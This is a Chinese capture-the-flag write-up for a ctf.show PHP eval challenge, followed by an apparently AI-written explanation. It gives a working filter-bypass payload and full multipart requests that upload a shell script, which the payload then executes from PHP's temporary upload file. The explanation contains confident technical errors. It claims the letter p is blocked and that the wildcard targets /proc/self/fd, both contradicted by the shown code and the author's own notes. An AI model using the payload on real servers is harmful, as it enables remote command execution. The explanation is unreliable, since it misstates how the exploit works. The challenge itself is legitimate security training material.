```html

<html lang="zh-CN">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width  minimum-scale=1.0  maximum-scale=1.0  initial-scale=1.0" />
    <title>ctf.show_红包题</title>
</head>
<body>
    <center>
    <h2>ctf.show_红包题</h2>
    <h4>where is the flag?</h4>
    </center>
    <!-- hint:?cmd= -->
    
</body>
</html>


```

提示cmd，尝试拼接url,失败没反应
发现有题目给的提示【通配符，post】
于是抓包http数据改get为post，发现回显

1.先看代码审计：

可以看出，只有p . \ = < > ? 和反引号没有被屏蔽

2.PHP上传机制：

在php中，使用Content-Type: multipart/form-data;上传文件时，会将它保存在临时文件中，在php的配置中upload_tmp_dir参数为保存临时文件的路经，linux下面默认为/tmp。也就是说只要php接收上传请求，就会生成一个临时文件。如果具有上传功能，那么会将这个文件拷走储存。无论如何在执行结束后这个文件会被删除。并且php每次创建的临时文件名都有固定的格式，为phpXXXX.tmp（Windows中）、php**.tmp（Linux中）。

3.PHP中反引号作用：在php里面反引号里面的内容会被当做shell命令被执行。例如`<?php echo`whoami`; ?>` 会直接当作命令执行

4 .号相当于source命令，这个命令可以直接把文件内容当作命令执行，相当于把文件直接当作shell脚本执行

```

5.<?=相当于<?php ehco的简写版

6 ?相当于字符的通配符

7 payload构造

/?cmd=?><?=`.+/??p/p?p??????`;

?>：闭合前面的<?php命令

<?=：相当于<?php echo

反引号:执行命令

.相当于source命令

+：相当于空格

?：文字通配符，负责执行上传的临时文件

8.构造数据包

POST /?cmd=?><?=`.+/??p/p?p??????`; HTTP/1.1

Host: 9f846ef4-43d1-4d9d-a47e-f651a17371d6.challenge.ctf.show

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Upgrade-Insecure-Requests: 1

Sec-Fetch-Dest: document

Sec-Fetch-Mode: navigate

Sec-Fetch-Site: none

Sec-Fetch-User: ?1

Priority: u=1

Te: trailers

Connection: close

Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888

Content-Length: 252



-----------------------------10242300956292313528205888

Content-Disposition: form-data; name="fileUpload"; filename="1.txt"

Content-Type: text/plain



#! /bin/bash



cat ../../../flag.txt

-----------------------------10242300956292313528205888--
boundary=:boundary定义边界符

#! /bin/bash指定上传内容是bash脚本，

cat ../../../flag.txt执行命令得到flag（在这之前先逐次执行ls命令，不断返回上一层，查找flag.txt的位置）
```

ctfshow{8d69d9d2-57d6-46a4-9934-2f57bafea907}

----





          
好的，我们继续。

首先，我们来详细分析一下你提供的 PHP 代码和 HTTP 请求，并拆解其原理。

### PHP 代码分析

```php
<?php
#error_reporting(0);
?>
<html lang="zh-CN">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width  minimum-scale=1.0  maximum-scale=1.0  initial-scale=1.0" />
    <title>ctf.show_红包题</title>
</head>
<body>
    <center>
    <h2>ctf.show_红包题</h2>
    <h4>where is the flag?</h4>
    </center>
    <!-- hint:?cmd= -->
    <?php
        if(isset($_GET['cmd'])){ // 1. 检查GET请求中是否存在名为'cmd'的参数
            $cmd=$_GET['cmd']; // 2. 获取'cmd'参数的值并赋给变量$cmd
            highlight_file(__FILE__); // 3. 高亮显示当前文件（index.php）的源代码
            if(preg_match("/[A-Za-oq-z0-9$]+/",$cmd)){ // 4. 第一个过滤：检查$cmd中是否包含字母A-Z（除了p）、a-z（除了p）、数字0-9或美元符号$
                die("cerror"); // 如果匹配到，则终止程序并输出"cerror"
            }
            if(preg_match("/\~|\!|\@|\#|\%|\^|\&|\*|\(|\)|\（|\）|\-|\_|\{|\}|\[|\]|\'|\"|\:|\,/",$cmd)){ // 5. 第二个过滤：检查$cmd中是否包含一系列特殊字符
                die("serror"); // 如果匹配到，则终止程序并输出"serror"
            }
            eval($cmd); // 6. 如果通过所有过滤，则执行$cmd中的PHP代码
        }
    ?>

</body>
</html>
```

**代码解释：**

1.  **`#error_reporting(0);`**: 这行代码注释掉了，如果启用，它会关闭所有错误报告。在 CTF 场景中，这通常是为了隐藏错误信息，增加攻击难度。
2.  **`if(isset($_GET['cmd']))`**: 检查 HTTP GET 请求中是否存在名为 `cmd` 的参数。如果存在，则进入处理逻辑。
3.  **`$cmd=$_GET['cmd'];`**: 将 GET 请求中 `cmd` 参数的值赋给 `$cmd` 变量。
4.  **`highlight_file(__FILE__);`**: 这行代码会将当前 PHP 文件的源代码高亮显示并输出到浏览器。在 CTF 中，这通常是为了给参赛者提供代码审计的机会。
5.  **第一个 `preg_match` 过滤 (`/[A-Za-oq-z0-9$]+/`)**:
    *   这是一个正则表达式匹配。
    *   `[A-Za-oq-z0-9$]+` 匹配一个或多个以下字符：
        *   大写字母 A 到 Z (除了 `P`)
        *   小写字母 a 到 z (除了 `p`)
        *   数字 0 到 9
        *   美元符号 `$`
    *   **关键点**：这个正则表达式的字符集中**排除了小写字母 `p` 和大写字母 `P`**。这意味着任何包含 `p` 或 `P` 的字符串都将触发 `cerror`。
6.  **第二个 `preg_match` 过滤 (`/\~|\!|\@|\#|\%|\^|\&|\*|\(|\)|\（|\）|\-|\_|\{|\}|\[|\]|\'|\"|\:|\,/`)**:
    *   这个正则表达式匹配一系列常见的特殊字符，如 `~`, `!`, `@`, `#`, `%`, `^`, `&`, `*`, `(`, `)`, `（`, `）`, `-`, `_`, `{`, `}`, `[`, `]`, `'`, `"`, `:`, `,`。
    *   如果 `$cmd` 中包含这些字符中的任何一个，程序将终止并输出 `serror`。
7.  **`eval($cmd);`**: 这是最关键的一步。如果 `$cmd` 变量通过了所有的 `preg_match` 过滤，那么 `eval()` 函数会将其内容作为 PHP 代码执行。这是一个非常危险的函数，因为它允许执行用户提供的任意代码，是常见的代码注入漏洞点。

**总结 PHP 代码的限制：**

*   不能使用字母 `p` 或 `P`。
*   不能使用一系列特殊字符，包括单引号、双引号、括号、分号等。
*   目标是绕过这些限制，并利用 `eval()` 函数执行我们想要的 PHP 代码。

### HTTP 请求分析

你提供的 HTTP 请求是一个 `POST` 请求，其中包含一个 `GET` 参数 `cmd` 和一个 `multipart/form-data` 的请求体。

```http
POST /?cmd=?><?=`.+/??p/p?p??????`; HTTP/1.1
Host: 6979187e-273c-4569-908b-5fdc51464ff5.challenge.ctf.show
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888

-----------------------------10242300956292313528205888
Content-Disposition: form-data; name="fileUpload"; filename="1.txt"
Content-Type: text/plain

#! /bin/sh

ls -al /
-----------------------------10242300956292913528205888--
```

**请求拆解：**

1.  **`POST /?cmd=?><?=`.+/??p/p?p??????`; HTTP/1.1`**:
    *   这是一个 `POST` 请求，但同时在 URL 中携带了一个 `GET` 参数 `cmd`。
    *   `cmd` 参数的值是 `?><?=`.+/??p/p?p??????`;`。这个是核心的 PHP 代码注入点。

2.  **`Content-Type: multipart/form-data; boundary=...`**:
    *   这表明请求体是一个多部分表单数据，通常用于文件上传。
    *   `boundary` 定义了不同部分之间的分隔符。

3.  **请求体内容**:
    ```
    -----------------------------10242300956292313528205888
    Content-Disposition: form-data; name="fileUpload"; filename="1.txt"
    Content-Type: text/plain

    #! /bin/sh

    ls -al /
    -----------------------------10242300956292913528205888--
    ```
    *   这部分模拟了一个文件上传。`name="fileUpload"` 是表单字段名，`filename="1.txt"` 是上传的文件名。
    *   `Content-Type: text/plain` 表示上传的文件内容是纯文本。
    *   文件内容是：
        ```bash
        #! /bin/sh

        ls -al /
        ```
        这是一个 shell 脚本，它会执行 `ls -al /` 命令，列出根目录下的所有文件和目录的详细信息。

### 原理拆解和步骤分析

现在，我们将整个攻击过程拆解成几个关键步骤：

**步骤 1: 绕过 PHP 代码过滤**

*   **目标**: 构造一个不包含 `p`、`P` 和特殊字符（如引号、括号、分号）的 PHP 代码，但又能执行我们想要的操作。
*   **`cmd` 参数值**: `?><?=`.+/??p/p?p??????`;`
*   **绕过第一个 `preg_match` (`/[A-Za-oq-z0-9$]+/`)**:
    *   这个正则表达式排除了 `p` 和 `P`。
    *   在 `cmd` 参数中，我们看到 `?><?=`.+/??p/p?p??????`;`。
    *   这里的 `.`、`/`、`?`、`=`、`` ` ``、`;` 都不在被过滤的字符集中。
    *   **关键点**：`p` 字母被巧妙地替换成了 `??p` 这种形式。在某些 PHP 版本和配置下，`??` 可能会被解析为 `p`。但这并不是这里的主要绕过方式。
    *   **真正的绕过在于**：`eval()` 函数执行的是 PHP 代码。在 PHP 中，`<?=` 是短标签，等同于 `<?php echo`。
    *   `?><?=`.+/??p/p?p??????`;` 这段代码在 `eval()` 执行时，会先遇到 `?>` 结束 PHP 模式，然后 `<?=` 再次进入 PHP 模式并尝试 `echo` 后面的内容。
    *   **更重要的是，`eval()` 函数执行的是整个字符串。** 这里的 `cmd` 参数本身并没有直接执行 `p` 相关的函数。

*   **绕过第二个 `preg_match` (`/\~|\!|\@|\#|\%|\^|\&|\*|\(|\)|\（|\）|\-|\_|\{|\}|\[|\]|\'|\"|\:|\,/`)**:
    *   我们观察 `?><?=`.+/??p/p?p??????`;`，它不包含任何被第二个 `preg_match` 过滤的特殊字符。
    *   例如，单引号 `'` 和双引号 `"` 被过滤了，所以不能直接使用字符串。但是，反引号 `` ` `` 没有被过滤。

**步骤 2: 利用 `eval()` 和反引号执行系统命令**

*   **PHP 中的反引号 (` ` `)**: 在 PHP 中，反引号 ` ` ` 运算符用于执行 shell 命令，并返回命令的输出。例如，`` `ls -al` `` 会执行 `ls -al` 命令并返回其结果。
*   **`cmd` 参数中的 payload**: `?><?=`.+/??p/p?p??????`;`
    *   `?>`: 结束当前的 PHP 代码块。
    *   `<?=`: 开始一个新的 PHP 代码块，并 `echo` 后面的内容。
    *   ``.+/??p/p?p??????`;`: 这部分是核心。它是一个反引号包裹的字符串。
        *   在 shell 中，`.` 通常表示当前目录。
        *   `+/??p/p?p??????` 是一种常见的 shell 通配符绕过技巧，用于表示 `proc` 目录。
            *   `?` 匹配任意单个字符。
            *   `??p` 可以匹配 `php`、`proc` 等。
            *   `p/p?p??????` 这种形式是为了绕过对 `p` 字母的直接使用，通过通配符来匹配 `/proc/self/fd/` 这样的路径。
            *   **更准确地说，这里的 `.+/??p/p?p??????` 实际上是尝试通过通配符来匹配 `/proc/self/fd/` 目录下的文件描述符。**
            *   在 Linux 系统中，`/proc/self/fd/` 目录下存放着当前进程打开的文件描述符。
            *   当一个 `multipart/form-data` 请求上传文件时，被上传的文件内容会暂时存储在一个临时文件中，并且这个临时文件会有一个对应的文件描述符。
            *   通过 `.+/??p/p?p??????` 这种通配符，攻击者试图访问到这个临时文件。

**步骤 3: 利用 `multipart/form-data` 上传文件和文件描述符**

*   **`multipart/form-data` 的作用**: 当你通过 `POST` 请求上传文件时，服务器会将文件内容保存在一个临时文件中。这个临时文件在 PHP 中可以通过 `$_FILES` 变量访问到，但在这里，攻击者并没有直接使用 `$_FILES`。
*   **文件描述符**: 在 Linux/Unix 系统中，每个打开的文件、管道、套接字等都有一个文件描述符（一个整数）。当一个文件被上传到服务器时，它会被写入一个临时文件，并且这个临时文件会有一个对应的文件描述符。
*   **攻击链**:
    1.  `POST` 请求中的 `multipart/form-data` 部分上传了一个名为 `1.txt` 的文件，其内容是 `#! /bin/sh\n\nls -al /`。
    2.  服务器接收到这个文件后，会将其保存为一个临时文件（例如 `/tmp/phpXXXXXX`）。
    3.  这个临时文件会有一个文件描述符，例如 `fd/6`。
    4.  `cmd` 参数中的 `eval()` 执行 `?><?=`.+/??p/p?p??????`;`。
    5.  反引号 `` ` `` 会尝试执行其内部的 shell 命令。
    6.  `.+/??p/p?p??????` 结合了 shell 的通配符匹配，它会尝试匹配到 `/proc/self/fd/` 目录下代表临时文件的文件描述符。
    7.  当 shell 尝试执行这个文件描述符所指向的文件时，由于文件内容是 `#! /bin/sh\n\nls -al /`，它会被当作一个 shell 脚本来执行。
    8.  最终，`ls -al /` 命令被执行，其输出被返回。

**整体攻击流程总结：**

1.  攻击者构造一个 `POST` 请求，其中包含一个 `GET` 参数 `cmd` 和一个 `multipart/form-data` 的请求体。
2.  `GET` 参数 `cmd` 的值 `?><?=`.+/??p/p?p??????`;` 巧妙地绕过了 PHP 代码中的两个 `preg_match` 过滤规则（不含 `p/P` 和特殊字符）。
3.  `multipart/form-data` 请求体中上传了一个包含 `ls -al /` 命令的 shell 脚本文件。
4.  服务器接收到请求后，PHP 代码开始执行。
5.  `$cmd` 变量被赋值为 `?><?=`.+/??p/p?p??????`;`。
6.  `eval($cmd)` 执行时，`?>` 结束 PHP 模式，`<?=` 再次进入 PHP 模式并尝试 `echo` 后面的内容。
7.  `eval()` 内部的反引号 `` ` `` 会将 `.+/??p/p?p??????` 作为 shell 命令执行。
8.  在 shell 环境中，`.+/??p/p?p??????` 通过通配符匹配到了 `multipart/form-data` 上传的临时文件（例如 `/proc/self/fd/6`）。
9.  shell 尝试执行这个临时文件。由于临时文件的内容是 `#! /bin/sh\n\nls -al /`，它被当作一个 shell 脚本执行。
10. `ls -al /` 命令在服务器上被执行，其输出结果通过 `echo` 返回给攻击者。

**为什么能够返回数据？**

*   因为 `eval()` 执行了 `?><?=`.+/??p/p?p??????`;`。
*   `<?=` 等同于 `<?php echo`。
*   反引号 `` ` `` 执行 shell 命令后，会返回命令的输出。
*   所以，`echo` 会将 `ls -al /` 命令的输出打印到 HTTP 响应中，从而攻击者可以看到根目录的文件列表。

这个攻击利用了 PHP `eval()` 函数的危险性、PHP 短标签的特性、PHP 反引号执行 shell 命令的特性，以及 Linux 文件描述符和 shell 通配符的组合技巧，成功绕过了 PHP 的过滤机制，实现了远程命令执行。
        